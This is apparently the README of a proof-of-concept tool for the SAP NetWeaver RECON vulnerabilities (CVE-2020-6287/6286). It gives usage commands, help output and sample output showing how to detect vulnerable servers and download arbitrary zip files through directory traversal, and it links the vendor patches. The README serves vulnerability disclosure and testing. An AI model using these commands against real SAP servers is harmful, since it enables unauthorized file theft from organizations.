PoC for CVE-2020-6287, CVE-2020-6286 (SAP RECON vulnerability)

~~Pffff! RECON (Remotely Exploitable Code On NetWeaver)? Guys, really? That was the best codename you came up with? :)~~ 

This scrip allows to check SAP LM Configuration Wizard missing authorization check vulnerability and as a PoC script exploits directory traversal in `queryProtocol` method.

Directory traversal allows to download any `zip` from SAP server.

***This PoC doesn't provide RCE/user creation functionality.<br>This project is created only for educational purposes and cannot be used for law violation or personal gain.
<br>The author of this project is not responsible for any possible harm caused by the materials of this project***

Original finding: [Pablo Artuso](https://twitter.com/lmkalg)

Solution: [#2934135](https://launchpad.support.sap.com/#/notes/2934135), [#2939665](https://launchpad.support.sap.com/#/notes/2939665)



# How to use


Just point SAP NW AS Java hostnmae/ip.

There is additional options:

1. `-c` - check if SAP server is vulnerable to RECON
2. `-f` - download `zip` file from SAP server


Ex.:

```
~python RECON.py -H 172.16.30.8 -f /1111.zip
Check1 - Vulnerable! - http://172.16.30.8:50000/CTCWebService/CTCWebServiceBean
Ok! File zipfile_929.zip was saved
```

## All options


```
~python RECON.py -h
usage: RECON.py [-h] [-H HOST] [-P PORT] [-s] [-c] [-f ZIPFILE]
                [--timeout TIMEOUT] [-v]

PoC for CVE-2020-6287, CVE-2020-6286 (RECON)
This scrip allows to check SAP LM Configuration Wizard missing authorization check vulnerability and exploits dir traversal in queryProtocol method
Original finding: Pablo Artuso. https://twitter.com/lmkalg
Solution: https://launchpad.support.sap.com/#/notes/2934135, https://launchpad.support.sap.com/#/notes/2939665

optional arguments:
  -h, --help            show this help message and exit
  -H HOST, --host HOST  Java NW host (default: 127.0.0.1)
  -P PORT, --port PORT  Java NW web port (default: tcp/50000)
  -s, --ssl             enable SSL
  -c, --check           just detect vulnerability
  -f ZIPFILE, --zipfile ZIPFILE
                        ZIP file to read. CVE-2020-6286
  --timeout TIMEOUT     HTTP connection timeout in second (default: 10)
  -v, --verbose         verbose mode
```
